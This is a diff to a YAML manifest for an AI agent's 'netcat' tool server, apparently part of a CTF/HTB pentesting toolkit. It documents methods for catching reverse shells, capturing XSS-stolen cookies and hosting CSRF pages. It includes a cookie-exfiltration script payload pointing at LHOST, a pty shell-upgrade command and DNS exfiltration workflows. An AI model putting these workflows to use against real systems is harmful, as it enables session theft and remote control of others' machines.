@@ -1,6 +1,6 @@
 name: netcat
 version: "2.0"
-description: "Network utility for reverse shells, HTTP callback capture, UDP, and port testing"
+description: "Async networking server (Python, aiohttp) for TCP listeners, HTTP callback capture, UDP packet capture, and port testing. 14 methods across 3 transport types: TCP (listen with blocking/non-blocking modes, listener_status/read/write for interactive shell control, exec for one-shot capture, connect for bind shells), HTTP (http_listen with file serving and TLS/auto-cert, http_requests for captured request inspection, http_file for dynamic content), UDP (udp_listen, udp_packets, udp_send), plus check_port, get_interfaces (for LHOST), list, stop. TCP listeners support response templates (fake HTTP responses). HTTP server captures all requests with headers/cookies/query params. Auto-persists to /session/netcat/ when >50 requests or >100KB data. TLS support with auto-generated self-signed certs. Container includes netcat-traditional, ncat, socat, iproute2 as fallback tools."
 image: "ghcr.io/silicon-works/mcp-tools-netcat:latest"
 image_size_mb: 150
 
@@ -21,15 +21,19 @@ see_also:
 
 routing:
   use_for:
-    - "catch reverse shell"
-    - "capture HTTP callback"
-    - "steal cookies via XSS"
-    - "host CSRF page"
-    - "capture admin bot request"
-    - "UDP packet capture"
+    - "catch reverse shell connection from target"
+    - "start HTTP server to capture XSS cookie callbacks"
+    - "host CSRF exploit page for admin bot to visit"
+    - "capture HTTP requests with headers cookies and query params"
+    - "listen for UDP packets for DNS exfiltration or SNMP"
+    - "connect to bind shell on target"
+    - "check if port is open and grab service banner"
+    - "get attacker IP address for LHOST in reverse shells"
+    - "serve exploit files over HTTP or HTTPS"
   never_use_for:
     - "persistent SSH sessions (use shell-session)"
-    - "complex HTTP requests (use curl)"
+    - "complex HTTP requests with custom encoding (use curl)"
+    - "port scanning (use nmap)"
   triggers:
     - "reverse shell"
     - "callback server"
@@ -37,6 +41,9 @@ routing:
     - "XSS callback"
     - "CSRF host"
     - "admin bot"
+    - "netcat listener"
+    - "catch shell"
+    - "LHOST"
 
 phases:
   - exploitation
@@ -52,320 +59,320 @@ resources:
 
 methods:
   listen:
-    description: "Start TCP listener for reverse shell or connection capture"
-    when_to_use: "Before triggering a reverse shell payload, or to capture any TCP connection"
+    description: "Start a TCP listener on the specified port for catching reverse shells or capturing incoming connections. Two modes: blocking (timeout>0) waits for a connection and returns initial data, non-blocking (timeout=0) returns immediately with a listener_id for polling via listener_status. Supports response templates — sends configured data upon connection (useful for faking HTTP responses). Binds on 0.0.0.0. Returns listener_id for interactive use with listener_read/listener_write."
+    when_to_use: "The first step before triggering a reverse shell payload. Workflow: (1) get_interfaces to find LHOST, (2) listen on chosen port with timeout=0 for non-blocking, (3) Trigger the reverse shell (via curl inject, exploit-runner, etc.), (4) listener_status to check for connection, (5) listener_read/listener_write for interactive commands. Use timeout=300 (blocking) when you want to wait for the shell in one call. Use response param to fake an HTTP response for SSRF callbacks. For simple one-shot captures, use exec instead."
     params:
       port:
         type: integer
         required: true
-        description: "Port to listen on (>1024 for non-privileged)"
+        description: "Port to listen on. Use >1024 for non-privileged containers. Common ports: 4444, 9001, 8443."
       timeout:
         type: integer
         default: 300
-        description: "Wait timeout in seconds (0=non-blocking, returns immediately)"
+        description: "Wait timeout in seconds. 0=non-blocking (returns immediately, use listener_status to poll). >0=blocking (waits for connection up to timeout seconds)."
       response:
         type: string
-        description: "Data to send upon connection (e.g., fake HTTP response)"
+        description: "Data to send to the connecting client upon connection. Useful for faking HTTP responses in SSRF scenarios."
     returns:
       listener_id:
         type: string
-        description: "Unique listener ID for subsequent operations"
+        description: "Unique listener ID (tcp_<hex>) for listener_status, listener_read, listener_write, and stop."
       port:
         type: integer
-        description: "Port listening on"
+        description: "Port listening on."
       status:
         type: string
-        description: "Listener status (listening or connected)"
+        description: "Listener status: 'listening' (no connection yet) or 'connected' (client connected)."
 
   listener_status:
-    description: "Check status of a TCP listener"
-    when_to_use: "After starting a non-blocking listener, to check if connection received"
+    description: "Check the current status of a TCP listener — whether it's still listening, has received a connection, or has been closed. Returns remote IP/port and any buffered data if connected."
+    when_to_use: "After starting a non-blocking listener (timeout=0), poll this to check if a reverse shell or other connection has arrived. Also useful to check if an existing connection is still alive before sending commands via listener_write."
     params:
       listener_id:
         type: string
         required: true
-        description: "Listener ID from listen()"
+        description: "Listener ID from listen() (tcp_<hex> format)."
     returns:
       status:
         type: string
-        description: "listening, connected, or closed"
+        description: "Current status: 'listening' (waiting), 'connected' (client connected), or 'closed' (connection ended)."
       remote_ip:
         type: string
-        description: "Connected client IP (if connected)"
+        description: "Connected client's IP address (only when status='connected')."
 
   listener_read:
-    description: "Read data from connected TCP client"
-    when_to_use: "After connection established, to receive data from reverse shell"
+    description: "Read data from a connected TCP client (up to 64KB per read). Appends to the listener's internal buffer. Returns the received data as text. If the remote end closes the connection, marks the listener as 'closed'."
+    when_to_use: "After a reverse shell connects, to read command output. Typical flow: listener_write('id\\n') → listener_read() → see 'uid=0(root)'. Also useful for reading initial banners from services."
     params:
       listener_id:
         type: string
         required: true
-        description: "Listener ID"
+        description: "Listener ID from listen()."
       timeout:
         type: integer
         default: 30
-        description: "Read timeout in seconds"
+        description: "Read timeout in seconds. Increase for slow commands."
     returns:
       data:
         type: string
-        description: "Data received from client"
+        description: "Data received from the connected client."
 
   listener_write:
-    description: "Write data to connected TCP client"
-    when_to_use: "To send commands to a reverse shell"
+    description: "Write data to a connected TCP client. Sends raw bytes (encoded as UTF-8). Returns the number of bytes sent. If the connection is closed, marks the listener as 'closed'."
+    when_to_use: "To send commands to a reverse shell. Remember to append '\\n' to commands (e.g., data='whoami\\n'). For upgrading a shell: data='python3 -c \"import pty;pty.spawn(\\\"/bin/bash\\\")\"\\n'. Follow each write with a listener_read to capture the output."
     params:
       listener_id:
         type: string
         required: true
-        description: "Listener ID"
+        description: "Listener ID from listen()."
       data:
         type: string
         required: true
-        description: "Data to send"
+        description: "Data to send to the connected client. Include '\\n' for command execution."
     returns:
       bytes_sent:
         type: integer
-        description: "Number of bytes sent"
+        description: "Number of bytes sent."
 
   exec:
-    description: "One-shot TCP capture: listen, wait for connection, capture output"
-    when_to_use: "Simple reverse shell capture when you don't need interactive control"
+    description: "One-shot TCP capture: listen on a port, accept one connection, read all data until connection closes or 5s idle, then return everything. Uses blocking sockets (not async). Simpler than listen+read flow but no interactive control — you get all output at once after the connection ends."
+    when_to_use: "For capturing one-shot command output (like 'id' or 'cat /etc/passwd') from a reverse connection, SSRF callbacks, or blind RCE confirmation. NOT suitable for interactive reverse shells — use listen + listener_read/listener_write for that. Also useful for capturing data exfiltration over TCP."
     params:
       port:
         type: integer
         required: true
-        description: "Port to listen on"
+        description: "Port to listen on."
       timeout:
         type: integer
         default: 60
-        description: "Total timeout in seconds"
+        description: "Total timeout waiting for a connection."
     returns:
       output:
         type: string
-        description: "Captured output from connection"
+        description: "All data received from the connection."
       remote_ip:
         type: string
-        description: "Source IP of connection"
+        description: "Source IP of the connecting client."
 
   http_listen:
-    description: "Start HTTP server for serving files and capturing requests (cookies, XSS callbacks)"
-    when_to_use: "When you need to host CSRF pages, capture XSS callbacks, or steal cookies from admin bots"
+    description: "Start an HTTP server (via aiohttp) that serves files and captures all incoming requests with full headers, cookies, query parameters, and POST body. Supports TLS with auto-generated self-signed certs or custom cert/key pairs. Auto-detects MIME types for served files. All requests are logged even for paths without files (returns 404 but still captures). Auto-persists to /session/netcat/ when >50 requests or >100KB data. Keepalive timer (1-30 min) auto-stops idle servers."
+    when_to_use: "For CTF/HTB challenges that involve browser interaction: (1) XSS cookie stealing — host a page with '<script>fetch(\"http://LHOST:PORT/?c=\"+document.cookie)</script>', then check http_requests for the cookie, (2) CSRF exploitation — serve a malicious form that auto-submits to the target, (3) SSRF confirmation — start server and check if target makes a request, (4) Serve exploit payloads — host malicious .html, .js, or .xml files for the admin bot to fetch. Always call get_interfaces first to determine your LHOST for the URL."
     params:
       port:
         type: integer
         required: true
-        description: "Port to listen on"
+        description: "Port to listen on. Common: 80, 8080, 8443 (for HTTPS)."
       files:
         type: object
-        description: "Files to serve: {'/path': 'content', ...}"
+        description: "Initial files to serve as {'/path': 'content'} dict. Example: {'/index.html': '<script>...</script>', '/exploit.js': 'fetch(...)'}. MIME type auto-detected from extension."
       tls:
         type: boolean
         default: false
-        description: "Enable HTTPS with auto-generated self-signed cert"
+        description: "Enable HTTPS. If cert/key not provided, generates a self-signed cert automatically."
       cert:
         type: string
-        description: "PEM certificate (base64 or raw) for custom TLS"
+        description: "PEM certificate content (base64-encoded or raw PEM text) for custom TLS."
       key:
         type: string
-        description: "PEM private key (base64 or raw) for custom TLS"
+        description: "PEM private key content (base64-encoded or raw PEM text) for custom TLS."
       timeout:
         type: integer
         default: 0
-        description: "Server timeout (0=indefinite until stop)"
+        description: "Server timeout in seconds. 0=runs indefinitely until stop() is called."
       keepalive:
         type: integer
         default: 5
-        description: "Keepalive minutes (1-30, resets on MCP calls)"
+        description: "Keepalive timeout in minutes (1-30). Server auto-stops if no MCP calls within this period. Resets on every MCP call."
     returns:
       server_id:
         type: string
-        description: "Server ID for subsequent operations"
+        description: "Server ID (http_<hex>) for http_requests, http_file, and stop."
       url:
         type: string
-        description: "Full URL to access server (e.g., http://10.10.14.5:8080)"
+        description: "Full URL including detected LHOST IP (e.g., 'http://10.10.14.5:8080')."
 
   http_requests:
-    description: "Get captured HTTP requests from server"
-    when_to_use: "To retrieve cookies, query params, or other data from captured requests"
+    description: "Retrieve all captured HTTP requests from an HTTP server. Each request includes: timestamp, method, path, query params, all headers (including cookies), POST body, source IP/port. Reads from both in-memory buffer and persisted JSONL file. Returns up to 50 requests inline; full dataset available in persisted file. Resets keepalive timer."
+    when_to_use: "After the admin bot or target visits your HTTP server, to extract: (1) Cookies — look in headers['Cookie'] for session tokens, (2) Query parameters — XSS callbacks like /?c=<cookie_value>, (3) POST body — form submissions from CSRF exploits, (4) Referrer and User-Agent for fingerprinting. Use since param to filter new requests only. Use clear=true to reset after processing."
     params:
       server_id:
         type: string
         required: true
-        description: "Server ID from http_listen()"
+        description: "Server ID from http_listen()."
       since:
         type: string
-        description: "Only requests after this ISO timestamp"
+        description: "ISO timestamp filter — only return requests after this time."
       clear:
         type: boolean
         default: false
-        description: "Clear requests after reading"
+        description: "Clear all captured requests after reading (both in-memory and persisted file)."
     returns:
       requests:
         type: array
-        description: "Captured requests with method, path, query, headers, body"
+        description: "Captured requests (up to 50), each with: timestamp, method, path, query, headers, body, source_ip, source_port."
       request_count:
         type: integer
-        description: "Total number of requests"
+        description: "Total number of requests (may exceed 50 inline limit)."
       file:
         type: string
-        description: "Path to persisted file if >50 requests"
+        description: "Path to JSONL file with all requests (when >50 captured)."
 
   http_file:
-    description: "Add, update, or remove a file on HTTP server"
-    when_to_use: "To dynamically add exploit pages or modify served content"
+    description: "Add, update, or remove a file on a running HTTP server. Set content to add/update a file, omit content to delete. MIME type is auto-detected from extension (.html→text/html, .js→application/javascript, .json→application/json, etc.) or can be set manually. Paths are automatically prefixed with '/' if missing."
+    when_to_use: "To dynamically change what the HTTP server serves without restarting it. Common uses: (1) Update XSS payload after first callback fails, (2) Add a new exploit page targeting a different endpoint, (3) Serve different CSRF forms for different targets, (4) Remove a file after it's been fetched to avoid re-triggering."
     params:
       server_id:
         type: string
         required: true
-        description: "Server ID"
+        description: "Server ID from http_listen()."
       path:
         type: string
         required: true
-        description: "URL path (e.g., '/exploit.html')"
+        description: "URL path to serve the file at (e.g., '/exploit.html', '/api/data.json')."
       content:
         type: string
-        description: "File content (omit to delete)"
+        description: "File content. Omit entirely to delete the file at this path."
       content_type:
         type: string
-        description: "MIME type (auto-detected if omitted)"
+        description: "MIME type override. Auto-detected from extension if omitted."
     returns:
       action:
         type: string
-        description: "updated or deleted"
+        description: "'updated' (file added/changed) or 'deleted' (file removed)."
 
   udp_listen:
-    description: "Start UDP listener for packet capture"
-    when_to_use: "For DNS exfiltration, SNMP, or other UDP-based attacks"
+    description: "Start a UDP listener for capturing incoming packets. Non-blocking — returns immediately and packets accumulate in memory. Each packet is captured with source IP, source port, decoded text, and hex representation. Auto-persists to JSONL file when >50 packets."
+    when_to_use: "For capturing UDP-based data: (1) DNS exfiltration — listen on port 53, trigger DNS lookups from target with embedded data, (2) SNMP trap capture — listen on port 162, (3) Syslog capture — listen on port 514, (4) Confirming blind SSRF via DNS/UDP. After starting, use udp_packets to retrieve captured data."
     params:
       port:
         type: integer
         required: true
-        description: "Port to listen on"
+        description: "UDP port to listen on."
       timeout:
         type: integer
         default: 0
-        description: "Listener timeout (0=indefinite)"
+        description: "Listener timeout in seconds. 0=runs indefinitely until stop()."
     returns:
       listener_id:
         type: string
-        description: "Listener ID for subsequent operations"
+        description: "Listener ID (udp_<hex>) for udp_packets and stop."
 
   udp_packets:
-    description: "Get captured UDP packets"
-    when_to_use: "To retrieve data from UDP-based exfiltration or attacks"
+    description: "Retrieve captured UDP packets from a listener. Each packet includes source IP, source port, decoded text data, and hex-encoded data. Returns up to 50 packets inline; full dataset persisted to JSONL file when threshold exceeded."
+    when_to_use: "After starting a UDP listener, to check what packets have been received. Use for DNS exfiltration decoding, SNMP data parsing, or confirming UDP-based SSRF. Use clear=true to reset the packet buffer."
     params:
       listener_id:
         type: string
         required: true
-        description: "Listener ID from udp_listen()"
+        description: "Listener ID from udp_listen()."
       clear:
         type: boolean
         default: false
-        description: "Clear packets after reading"
+        description: "Clear all captured packets after reading."
     returns:
       packets:
         type: array
-        description: "Captured packets with source_ip, source_port, data, data_hex"
+        description: "Captured packets, each with: timestamp, source_ip, source_port, data (text), data_hex (hex)."
 
   udp_send:
-    description: "Send UDP packet to remote host"
-    when_to_use: "For UDP-based exploits or testing"
+    description: "Send a single UDP packet to a remote host. Uses Python socket (not nc). Data is encoded as UTF-8."
+    when_to_use: "For UDP-based exploits, service testing, or triggering UDP-based vulnerabilities. Examples: sending crafted SNMP packets, DNS queries, or syslog messages."
     params:
       host:
         type: string
         required: true
-        description: "Target host"
+        description: "Target hostname or IP."
       port:
         type: integer
         required: true
-        description: "Target port"
+        description: "Target UDP port."
       data:
         type: string
         required: true
-        description: "Data to send"
+        description: "Data payload to send (encoded as UTF-8)."
     returns:
       bytes_sent:
         type: integer
-        description: "Number of bytes sent"
+        description: "Number of bytes sent."
 
   connect:
-    description: "Connect to remote TCP host"
-    when_to_use: "To connect to a bind shell or interact with a network service"
+    description: "Connect to a remote TCP host, optionally send data, read the response (up to 64KB, 10s read timeout), then close. Uses asyncio streams. Handles connection timeout, connection refused, and general errors."
+    when_to_use: "To connect to a bind shell on a target or interact with a raw TCP service. Use cases: (1) Connect to a bind shell planted by an exploit, (2) Send raw protocol data to test a service, (3) Grab a service banner by connecting and reading. For persistent interactive sessions, use listen (for reverse shells) or shell-session (for SSH)."
     params:
       host:
         type: string
         required: true
-        description: "Target host"
+        description: "Target hostname or IP."
       port:
         type: integer
         required: true
-        description: "Target port"
+        description: "Target TCP port."
       data:
         type: string
-        description: "Data to send after connecting"
+        description: "Data to send immediately after connecting. Include '\\n' for line-terminated protocols."
       timeout:
         type: integer
         default: 30
-        description: "Connection timeout in seconds"
+        description: "Connection timeout in seconds."
     returns:
       response:
         type: string
-        description: "Response from remote host"
+        description: "Response data from the remote host (up to 64KB)."
 
   check_port:
-    description: "Check if TCP port is open"
-    when_to_use: "Quick port connectivity check"
+    description: "Quick TCP port connectivity check — connects, optionally grabs a service banner (2s timeout), then closes. Returns open/closed/filtered status. Does NOT perform full service detection like nmap."
+    when_to_use: "For quick port checks during exploitation: (1) Verify a service is running before attacking, (2) Confirm a port opened after exploitation (e.g., bind shell), (3) Check if a firewall rule was modified. Faster than nmap for single-port checks. Returns banner if the service sends one automatically."
     params:
       host:
         type: string
         required: true
-        description: "Target host"
+        description: "Target hostname or IP."
       port:
         type: integer
         required: true
-        description: "Target port"
+        description: "Target TCP port."
       timeout:
         type: integer
         default: 5
-        description: "Connection timeout in seconds"
+        description: "Connection timeout in seconds."
     returns:
       open:
         type: boolean
-        description: "Whether port is open"
+        description: "Whether the port accepted a connection."
       banner:
         type: string
-        description: "Service banner if available"
+        description: "Service banner (if the service sends one on connect)."
 
   get_interfaces:
-    description: "Get network interfaces and IP addresses (for LHOST)"
-    when_to_use: "To determine LHOST for reverse shell payloads"
+    description: "Get non-loopback network interfaces with their IPv4 addresses from the container. Uses 'ip -j addr' for structured output. Essential for determining LHOST when setting up reverse shell payloads."
+    when_to_use: "Before creating reverse shell payloads — you need to know your IP address (LHOST). Call this first, then use the returned IP in exploit-runner generate_payload or in manual payload construction. The first non-loopback interface is typically the correct one (e.g., eth0 on HTB/CTF VPN)."
     params: {}
     returns:
       interfaces:
         type: array
-        description: "Network interfaces with IP addresses"
+        description: "Network interfaces, each with: interface name and IPv4 addresses."
 
   list:
-    description: "List all active listeners and servers"
-    when_to_use: "To see what listeners are running and their status"
+    description: "List all active TCP listeners, HTTP servers, and UDP listeners with their current status, ports, and metadata."
+    when_to_use: "To check what listeners and servers are currently running. Useful for: (1) Finding the listener_id/server_id you forgot, (2) Checking if a listener is still active, (3) Cleaning up before starting a new listener on the same port."
     params: {}
     returns:
       listeners:
         type: array
-        description: "Active TCP listeners, HTTP servers, and UDP listeners"
+        description: "All active listeners/servers with: id, type (tcp/http/udp), port, status, created_at."
 
   stop:
-    description: "Stop a listener or server by ID"
-    when_to_use: "To clean up listeners that are no longer needed"
+    description: "Stop a listener or server by its ID. For TCP listeners: closes the connection and returns buffered data. For HTTP servers: stops the aiohttp server and returns all captured requests (up to 50 inline). For UDP listeners: closes the transport and returns all captured packets."
+    when_to_use: "To clean up listeners and free ports. Always stop listeners when done to avoid port conflicts. For HTTP servers, the stop response includes all captured requests — useful as a final check before cleanup."
     params:
       id:
         type: string
         required: true
-        description: "Listener/server ID to stop"
+        description: "Listener/server ID to stop (tcp_<hex>, http_<hex>, or udp_<hex>)."
     returns:
       type:
         type: string
-        description: "Type of stopped listener (tcp, http, udp)"
+        description: "Type of stopped listener: 'tcp', 'http', or 'udp'."
       requests:
         type: array
-        description: "Final captured requests (for HTTP servers)"
+        description: "Final captured requests/packets (for HTTP servers and UDP listeners)."
